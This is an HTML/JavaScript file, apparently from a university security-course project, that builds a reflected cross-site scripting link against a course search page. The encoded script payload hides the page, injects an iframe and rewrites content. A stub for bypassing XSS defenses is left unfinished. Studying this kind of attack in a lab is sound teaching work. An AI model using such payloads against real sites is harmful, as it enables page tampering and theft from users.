<html>
<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
</script>
<script>
// Extend this function:
function payload(attacker) {
  function proxy(href) {
    $("html").load(href, function(){
      $("html").show();
      $("#query").val("pwned!");
    });
  }
  
  $("html").hide();
  
  $('body').children().hide()
  $('<iframe>')
    .css({
  position: 'absolute',
  width: '100%',
  height: '100%',
  top: 0,
  left: 0,
  border: 0,
  background: '#fff'
  })
  .attr('src', "html")
  .appendTo('body');
  proxy("./");
}

function makeLink(xssdefense, target, attacker) {
  if (xssdefense == 0) {
    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
      encodeURIComponent("<script" + ">" + payload.toString() +
      ";payload(\"" + attacker + "\");</script" + ">");
    } else {
    // Implement code to defeat XSS defenses here.
    }
}
  
var xssdefense = 0;
var target = "http://cis551.cis.upenn.edu/project3/";
var attacker = "http://127.0.0.1:31337/";

$(function() {
  var url = makeLink(xssdefense, target, attacker);
  $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Yay!</a>");
});
  
</script>

<h3></h3>
</html>
